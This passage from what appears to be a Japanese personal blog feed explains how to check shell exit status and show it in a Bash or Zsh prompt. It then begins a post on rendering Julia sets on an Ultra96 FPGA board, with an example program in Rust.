<p>僕はこういった質問をたまに受けたりするのですが、これ、とても困るのです。まず実行したコマンドのうち何が失敗したのかの特定から始めることになるため、例えば互いの貴重な時間をそれなりに消費することになったりで双方にいいことがありません<a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>。</p>
<p>コマンドの出力をちゃんと読んでエラーを特定してから質問しろとは言いません<a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>。でもせめて、<strong>Exit status</strong> ってやつくらいは確認してください。<strong>たった数桁の数字がゼロでないかを確認するだけ</strong>です。これで、「xxx のコマンドの実行に失敗したんだけど…」と言えるようになりましょう。</p>
<!--more-->
<h2 id="exit-status-って何">Exit status って何？</h2>
<p>Exit status (exit code や return status などとも呼ばれます) は、あるプロセス (≒ コマンド) が終了するときに、そのプロセスを起動した親のプロセスに返す 0 ~ 255 の値のことです。今回の話題であるシェル (Bash や Zsh など) での作業であれば、実行したコマンドがシェルに返す値のことを指します。</p>
<p>シェルで直前に実行したコマンドの Exit status は、シェル変数 <code>$?</code> を見ることで確認することができます。<a href="https://linux.die.net/man/1/true"><code>true(1)</code></a> と <a href="https://linux.die.net/man/1/false"><code>false(1)</code></a> の Exit status を確認してみるとこんな感じになると思います。</p>
<pre><code>$ true
$ echo $?
0

$ fase
$ echo $?
1</code></pre>
<p>この Exit status は何のための値なのかというと、プロセスの実行結果を簡潔に親プロセスに伝える役割があります。例えば <a href="https://linux.die.net/man/1/ls"><code>ls(1)</code></a> コマンドの <code>man</code> をみてみると、このコマンドの Exit status についてこのような説明がされています。</p>
<blockquote>
<h3 id="exit-status">Exit status:</h3>
<ol start="0" type="1">
<li>if OK,</li>
<li>if minor problems (e.g., cannot access subdirectory),</li>
<li>if serious trouble (e.g., cannot access command-line argument).</li>
</ol>
</blockquote>
<p>で、ここで僕が伝えたいのは、実行したコマンドの Exit status がどういう意味を持っているか調べようということではありません。*nix のシェルコマンドの大半は Exit status がゼロなら正常終了、それ以外の値は何かしらの問題が発生しているのだということです。つまり、<strong>Exit status という数桁の数字がゼロでないかを確認するだけで、コマンドが出力したメッセージなどを読まなくとも正常終了したか判断できる</strong>のです。</p>
<h2 id="プロンプトに-exit-status-を表示するようにしよう">プロンプトに Exit status を表示するようにしよう</h2>
<p>でもいちいち <code>echo $?</code> とかするの面倒だし、<code>$?</code> はすぐ上書きされちゃって必要なときに参照できないし… となると思います。そこで今回紹介するのが<strong>プロンプトに Exit status を表示</strong>する方法です。プロンプトってのはコマンドを入力するとき右に表示されている <code>$</code> や <code>username@hostname</code> とかが表示されている部分のことです。</p>
<p>例えば僕のシェル<a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a>では、直前に実行したコマンドの Exit status がゼロでなかったときに、赤の太字でその値を表示するようにしています。
<img src="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/shell.svg" /></p>
<p>こんな感じにしておけば、直前のコマンドが失敗したかを次のコマンドを入力する前に気づけますし、仮に複数のコマンドをコピペ<a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a>したときでも、どこで失敗したのかがひと目でわかるようになります。便利ですね。</p>
<h3 id="bash-の場合">Bash の場合</h3>
<p><code>echo $SHELL</code> という感じのコマンドを実行したときに <code>/bin/bash</code> などが表示されたら、その環境では Bash というシェルがデフォルトで使われるようになっています。</p>
<p>僕は普段 Bash を (カスタマイズして) 使わないのでいろいろ調べてみたところ、<a href="https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#index-PROMPT_005fCOMMAND"><code>PROMPT_COMMAND</code></a> をいじるといろいろ高度なことができそうです。とはいえ、最小限の設定で済ませるのであれば、<code>~/.bashrc</code> にこんな感じの行を追記するだけでよさそうです。</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="va">PS1</span><span class="op">=</span><span class="st">&quot;</span><span class="dt">\$</span><span class="st">(ret=</span><span class="dt">\$</span><span class="st">?; if [[ </span><span class="dt">\$</span><span class="st">ret != '0' ]]; then echo -n </span><span class="dt">\&quot;</span><span class="va">$(</span><span class="fu">tput</span> bold<span class="va">)$(</span><span class="fu">tput</span> setaf 1<span class="va">)</span><span class="dt">\$</span><span class="st">ret</span><span class="va">$(</span><span class="fu">tput</span> sgr0<span class="va">)</span><span class="st"> </span><span class="dt">\&quot;</span><span class="st">; fi)</span><span class="va">${PS1}</span><span class="st">&quot;</span></span></code></pre></div>
<p><a href="https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#index-PS1"><code>PS1</code></a>は、通常のプロンプトの文字列が設定されるシェル変数です。<code>./bashrc</code> に上記の行を追記することで、デフォルトで設定された <code>PS1</code> の先頭に Exit status 表示のための設定が入った文字列が再設定されます。追加している文字列は <code>\$(...)</code> という感じになっています。詳しい説明は省略しますが、こうすることでプロンプトが表示されるときにカッコ内のコマンドが評価され、そこで出力された文字列で <code>\$(...)</code> が置換されるようになります。</p>
<p><code>\$(...)</code> 内のコマンドを展開するとだいたいこんな感じ<a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a>になります。まず直前のコマンドの Exit status <code>$?</code> を変数 <code>ret</code> に退避させ、その値がゼロでなかったら <code>echo(1)</code> で表示、という感じです。ちなみに <code>echo(1)</code> に <code>-n</code> オプションを付けると、末尾の改行が出力されなくなります。</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="va">ret</span><span class="op">=</span><span class="va">$?</span></span>
<span id="cb3-2"><a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="kw">[[</span> <span class="va">$ret</span> <span class="ot">!=</span> <span class="st">'0'</span> <span class="kw">]];</span> <span class="cf">then</span></span>
<span id="cb3-3"><a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#cb3-3" aria-hidden="true" tabindex="-1"></a>  <span class="bu">echo</span> <span class="at">-n</span> <span class="st">&quot;</span><span class="va">$ret</span><span class="st"> &quot;</span></span>
<span id="cb3-4"><a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="cf">fi</span></span></code></pre></div>
<p>この設定をしてみた Bash (version 5.0.7) の例がこれです。いい感じですね。
<img src="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/bash.svg" /></p>
<h3 id="zsh-の場合">Zsh の場合</h3>
<p><code>echo $SHELL</code> という感じのコマンドを実行したときに <code>/bin/zsh</code> などが表示されたら、その環境では Zsh というシェルがデフォルトで使われるようになっています<a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#fn6" class="footnote-ref" id="fnref6" role="doc-noteref"><sup>6</sup></a>。</p>
<p>Zsh でも Bash で上げた例は有効です<a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#fn7" class="footnote-ref" id="fnref7" role="doc-noteref"><sup>7</sup></a>。けれども Zsh は <a href="http://zsh.sourceforge.net/Doc/Release/Prompt-Expansion.html">zsh: 13 Prompt Expansion</a> にあるように <code>%</code> で始まるエスケープシーケンスが豊富で、これを使ったほうがいい感じに書くことができます。</p>
<p><a href="http://zsh.sourceforge.net/Doc/Release/Prompt-Expansion.html#Shell-state">Shell state</a> にあるように、Zsh のプロンプトでは <code>%?</code> が Exit status に展開されます。これに <a href="http://zsh.sourceforge.net/Doc/Release/Prompt-Expansion.html#Conditional-Substrings-in-Prompts">Conditional Substrings in Prompts</a> で紹介されている <code>%(x.true-text.false-text)</code> と <a href="http://zsh.sourceforge.net/Doc/Release/Prompt-Expansion.html#Visual-effects">Visual effects</a> の各種エスケープシーケンスを組み合わせ、こんな感じの記述を <code>~/.zshrc</code> に追記することで Exit status が非ゼロならプロンプトの先頭にその値を赤太字で表示が実現できます。</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode zsh"><code class="sourceCode zsh"><span id="cb4-1"><a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co"># '%' で始まるエスケープシーケンスが展開されるようにする</span></span>
<span id="cb4-2"><a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="co"># デフォルトで有効になっている？ので必要ないかも</span></span>
<span id="cb4-3"><a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="bu">setopt</span> prompt_percent</span>
<span id="cb4-4"><a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#cb4-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-5"><a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="va">PROMPT</span><span class="op">=</span><span class="st">'%(?..%B%F{red}%?%f%b )${PROMPT}&quot;</span></span></code></pre></div>
<p>これを設定してみた Zsh (5.7.1) の例がこんな感じです。
<img src="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/zsh.svg" /></p>
<h2 id="おわり">おわり</h2>
<p>Exit status の重要さと、その値をプロンプトに表示することで、コマンド実行結果をひと目でわかるようにするテクニックを紹介をしました。これでシェル上での作業の問題を特定しやすくしたり、あいまいな質問に困る方が少しでも減ってくれるといいなと思います。</p>
<p>重要な値や文字列をプロンプトに表示したり、色を付けたりするのは Exit statusに限らず有効的だと思います。例えば Git などのバージョン管理システムの状態を表示するようにしたり、SSH などで複数のマシンをまたいだ作業をするならホスト名を目立つようにしておくと、コマンドを目的と違うホストで実行してしまう事故の抑制になったりするでしょう。この機会に、自分だけの最高のプロンプトを作ってみるのもいいのではないでしょうか。</p>
<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>せめて実行結果のログを送ってくれるだけでもいいのですが、それすらない場合が…<a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>もちろんコマンドの出力はちゃんと把握できたほうがいいですし、特に重要なメッセージ (エラーとか警告とか) だけでも拾えてほしいですが…<a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p>僕の Zsh の設定はここにあります <a href="https://github.com/Tosainu/dotfiles/blob/master/.zshrc" class="uri">https://github.com/Tosainu/dotfiles/blob/master/.zshrc</a><a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn4" role="doc-endnote"><p>複数コマンドを一度にコピペするのは安全でないのであまりおすすめはしませんね… 具体的な手法を書くのは最近不穏なのでやらないですが<br />
ちなみに僕はなにか説明するテキストを書くとき、コマンドの最初にわざと <code>$</code> 記号を付けるようにしているのですが、これは複数のコマンドのコピペをしにくくするというねらいがあったりもします<a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn5" role="doc-endnote"><p>上記例で実際に設定されている文字列は、<a href="https://linux.die.net/man/1/tput"><code>tput(1)</code></a> により出力した Exit status を赤太字で表示するためのエスケープシーケンスなどが含まれています<a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn6" role="doc-endnote"><p>まぁ Zsh が設定されているなら、たぶんこんなこと書かなくてもわかる方が大半だとは思いますが<a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#fnref6" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn7" role="doc-endnote"><p>ただし、プロンプト文字列内の <code>$()</code> (<a href="http://zsh.sourceforge.net/Doc/Release/Expansion.html#Command-Substitution">Command Substitution</a> というらしい) を展開するため <a href="http://zsh.sourceforge.net/Doc/Release/Options.html#Prompting"><code>PROMPT_SUBST</code></a> オプションが有効にされている必要があります<a href="https://blog.myon.info/entry/2019/08/08/do-not-ignore-exit-status/#fnref7" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>]]></summary>
</entry>
<entry>
    <title>Ultra96 で Julia set をぐりぐり動かせるやつを作った</title>
    <link href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/index.html" />
    <id>https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/index.html</id>
    <published>2019-05-15T03:52:00Z</published>
    <updated>2019-05-15T03:52:00Z</updated>
    <summary type="html"><![CDATA[<p><a href="https://www.96boards.org/product/ultra96/">Ultra96</a> というデバイスがあります。Ultra96 は Xilinx 社の <a href="https://www.xilinx.com/products/silicon-devices/soc/zynq-ultrascale-mpsoc.html">Zynq UltraScale+ MPSoC</a> が載っている開発ボードで、<a href="https://en.wikipedia.org/wiki/Field-programmable_gate_array">FPGA</a> 開発から最新の ARM 開発、Linux カーネルやそのデバイスドライバ開発なんかも学べて、しかも$249で入手できるというコスパの高い<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>デバイスです。</p>
<p>今回いろいろあって Ultra96 で遊べる環境ができたので、Julia set を表示してぐりぐり動かせるやつを作ってみました。こんな感じです。</p>
<blockquote class="twitter-tweet tw-align-center" data-lang="en">
<p lang="ja" dir="ltr">
当初の目標だった「Ultra96 に直接接続したゲームパッドでぐりぐり動かす」ができた ヾ(๑&gt;◡&lt;)ﾉ" <a href="https://t.co/AMDp3hPPnz">pic.twitter.com/AMDp3hPPnz</a>
</p>
— +。:.ﾟ٩(๑＞◡＜๑)۶:.｡+ﾟ (@myon___) <a href="https://twitter.com/myon___/status/1112762085799157763?ref_src=twsrc%5Etfw">April 1, 2019</a>
</blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<p>関連するソースコードはほぼ全て <a href="https://github.com/Tosainu/ultra96-fractal">GitHub のリポジトリ</a> に公開してあります。</p>
<p>まだ当初予定していた機能を実装しきれていなかったりしますが、とりあえずシステム全体とその開発方法などを紹介していきたいと思います。</p>
<!--more-->
<h2 id="julia-set">Julia set</h2>
<p><a href="https://en.wikipedia.org/wiki/Julia_set">Julia set</a> は<a href="https://en.wikipedia.org/wiki/Fractal">フラクタル</a>として知られる図形の1つです。同様の図形だと <a href="https://en.wikipedia.org/wiki/Mandelbrot_set">Mandelbrot set</a> のほうが有名かもしれませんが、個人的にはこっちのほうが好きです。</p>
<p>Julia set は、ある複素数の多項式関数 <span class="math inline">f_c(z)</span> に初期値 <span class="math inline">z_0</span> を与えて繰り返し適用したときに、収束する領域と発散する領域の境界になるような <span class="math inline">z_0</span> の集合のことらしいです。そして Julia set の描画は、画像の各ピクセルの座標値から <span class="math inline">z_0</span> を決めて、その値を <span class="math inline">f_c(z)</span> に与えて繰り返し適用したときの動きをもとに色を割り当てることで行います。</p>
<p>…といってもイメージしにくいので、有名な <span class="math inline">f_c(z)</span> である
<span class="math display">
f_c(z) = z^2 + c
</span>
を Rust で描いてみます。コードは <a href="https://github.com/image-rs/image#62-generating-fractals">image crate の Example</a> で紹介されているものをベースにしました。</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb1-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> main() <span class="op">{</span></span>
<span id="cb1-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-2" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 画像のサイズ</span></span>
<span id="cb1-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> (imgx<span class="op">,</span> imgy) <span class="op">=</span> (<span class="dv">960</span><span class="op">,</span> <span class="dv">600</span>)<span class="op">;</span></span>
<span id="cb1-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-4" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 最大反復回数</span></span>
<span id="cb1-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> max_iter <span class="op">=</span> <span class="dv">255</span><span class="op">;</span></span>
<span id="cb1-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> x0 <span class="op">=</span> <span class="dv">1.0</span><span class="op">;</span></span>
<span id="cb1-8"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> y0 <span class="op">=</span> imgy <span class="kw">as</span> <span class="dt">f32</span> <span class="op">/</span> imgx <span class="kw">as</span> <span class="dt">f32</span><span class="op">;</span></span>
<span id="cb1-9"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> dx <span class="op">=</span> <span class="dv">2.0</span> <span class="op">*</span> x0 <span class="op">/</span> imgx <span class="kw">as</span> <span class="dt">f32</span><span class="op">;</span></span>
<span id="cb1-10"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-10" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> dy <span class="op">=</span> <span class="dv">2.0</span> <span class="op">*</span> y0 <span class="op">/</span> imgy <span class="kw">as</span> <span class="dt">f32</span><span class="op">;</span></span>
<span id="cb1-11"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-12"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-12" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> <span class="kw">mut</span> imgbuf <span class="op">=</span> <span class="pp">image::ImageBuffer::</span>new(imgx<span class="op">,</span> imgy)<span class="op">;</span></span>
<span id="cb1-13"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-14"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-14" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> (x<span class="op">,</span> y<span class="op">,</span> pixel) <span class="kw">in</span> imgbuf<span class="op">.</span>enumerate_pixels_mut() <span class="op">{</span></span>
<span id="cb1-15"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-15" aria-hidden="true" tabindex="-1"></a>        <span class="co">// 定数 c</span></span>
<span id="cb1-16"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-16" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> c <span class="op">=</span> <span class="pp">num_complex::Complex::</span>new(<span class="op">-</span><span class="dv">0.4</span><span class="op">,</span> <span class="dv">0.6</span>)<span class="op">;</span></span>
<span id="cb1-17"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-18"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-18" aria-hidden="true" tabindex="-1"></a>        <span class="co">// 初期値 z_0</span></span>
<span id="cb1-19"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-19" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> cx <span class="op">=</span> <span class="op">-</span>x0 <span class="op">+</span> dx <span class="op">*</span> x <span class="kw">as</span> <span class="dt">f32</span><span class="op">;</span></span>
<span id="cb1-20"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-20" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> cy <span class="op">=</span> <span class="op">-</span>y0 <span class="op">+</span> dy <span class="op">*</span> y <span class="kw">as</span> <span class="dt">f32</span><span class="op">;</span></span>
<span id="cb1-21"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-21" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> z_0 <span class="op">=</span> <span class="pp">num_complex::Complex::</span>new(cx<span class="op">,</span> cy)<span class="op">;</span></span>
<span id="cb1-22"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-22" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-23"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-23" aria-hidden="true" tabindex="-1"></a>        <span class="co">// z_{i + 1} = z^2 + c を計算</span></span>
<span id="cb1-24"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-24" aria-hidden="true" tabindex="-1"></a>        <span class="co">// |z| &gt; 2.0 になったら &quot;発散した&quot; とする</span></span>
<span id="cb1-25"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-25" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> <span class="kw">mut</span> z <span class="op">=</span> z_0<span class="op">;</span></span>
<span id="cb1-26"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-26" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> <span class="kw">mut</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb1-27"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-27" aria-hidden="true" tabindex="-1"></a>        <span class="cf">while</span> i <span class="op">&lt;</span> max_iter <span class="op">&amp;&amp;</span> z<span class="op">.</span>norm() <span class="op">&lt;=</span> <span class="dv">2.0</span> <span class="op">{</span></span>
<span id="cb1-28"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-28" aria-hidden="true" tabindex="-1"></a>            z <span class="op">=</span> z <span class="op">*</span> z <span class="op">+</span> c<span class="op">;</span></span>
<span id="cb1-29"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-29" aria-hidden="true" tabindex="-1"></a>            i <span class="op">+=</span> <span class="dv">1</span><span class="op">;</span></span>
<span id="cb1-30"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-30" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb1-31"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-31" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-32"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-32" aria-hidden="true" tabindex="-1"></a>        <span class="co">// 反復回数 i をベースに色つけ</span></span>
<span id="cb1-33"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-33" aria-hidden="true" tabindex="-1"></a>        <span class="op">*</span>pixel <span class="op">=</span> colorize(i <span class="kw">as</span> <span class="dt">f32</span> <span class="op">/</span> max_iter <span class="kw">as</span> <span class="dt">f32</span>)<span class="op">;</span></span>
<span id="cb1-34"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-34" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb1-35"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-35" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-36"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-36" aria-hidden="true" tabindex="-1"></a>    imgbuf<span class="op">.</span>save(<span class="st">&quot;fractal.png&quot;</span>)<span class="op">.</span>unwrap()<span class="op">;</span></span>
<span id="cb1-37"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-37" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb1-38"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-38" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-39"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-39" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> colorize(t<span class="op">:</span> <span class="dt">f32</span>) <span class="op">-&gt;</span> <span class="pp">image::</span>Rgb<span class="op">&lt;</span><span class="dt">u8</span><span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb1-40"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-40" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> m <span class="op">=</span> <span class="pp">std::</span><span class="dt">u8</span><span class="pp">::</span><span class="cn">MAX</span> <span class="kw">as</span> <span class="dt">f32</span><span class="op">;</span></span>
<span id="cb1-41"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-41" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> r <span class="op">=</span> m <span class="op">*</span> <span class="dv">9.0</span> <span class="op">*</span> (<span class="dv">1.0</span> <span class="op">-</span> t) <span class="op">*</span> t <span class="op">*</span> t <span class="op">*</span> t<span class="op">;</span></span>
<span id="cb1-42"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-42" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> g <span class="op">=</span> m <span class="op">*</span> <span class="dv">15.0</span> <span class="op">*</span> (<span class="dv">1.0</span> <span class="op">-</span> t) <span class="op">*</span> (<span class="dv">1.0</span> <span class="op">-</span> t) <span class="op">*</span> t <span class="op">*</span> t<span class="op">;</span></span>
<span id="cb1-43"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-43" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> b <span class="op">=</span> m <span class="op">*</span> <span class="dv">8.5</span> <span class="op">*</span> (<span class="dv">1.0</span> <span class="op">-</span> t) <span class="op">*</span> (<span class="dv">1.0</span> <span class="op">-</span> t) <span class="op">*</span> (<span class="dv">1.0</span> <span class="op">-</span> t) <span class="op">*</span> t<span class="op">;</span></span>
<span id="cb1-44"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-44" aria-hidden="true" tabindex="-1"></a>    <span class="pp">image::</span>Rgb([r <span class="kw">as</span> <span class="dt">u8</span><span class="op">,</span> g <span class="kw">as</span> <span class="dt">u8</span><span class="op">,</span> b <span class="kw">as</span> <span class="dt">u8</span>])</span>
<span id="cb1-45"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb1-45" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>これを実行するとこんな感じの画像が出力されます。</p>
<p><img src="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/fractal_example.png" /></p>
<h2 id="fpga-で-julia-set-を描画する">FPGA で Julia set を描画する</h2>
<p>前述したコードからもわかるように、Julia set の描画はそこそこの計算量があります。これをいかに速く計算するかは長く研究されているようで、いろいろなアプローチが見つかります。今回は Zynq UltraScale+ MPSoC のプログラマブルな回路側 (Programmable Logic, PL) に <strong>Julia set の描画専用の回路を構築</strong>することで高速に描画することを試みてみました。</p>
<h3 id="高位合成-high-level-synthesis-hls">高位合成 (High-level synthesis, HLS)</h3>
<p>FPGA 開発というと、VHDL や Verilog HDL といった <a href="https://en.wikipedia.org/wiki/Hardware_description_language">Hardware description language (HDL)</a> によって <a href="https://en.wikipedia.org/wiki/Register-transfer_level">Register-transfer level (RTL)</a> の記述をするイメージが強いかもしれません。FPGA 開発全体でみればそのような言語を使った開発が一般的なのでしょうが、近年<a href="https://en.wikipedia.org/wiki/High-level_synthesis">高位合成 (High-level synthesis, HLS)</a> と呼ばれる技術がある程度の実用レベルになりつつあり、これを利用した開発手法が話題になっています。</p>
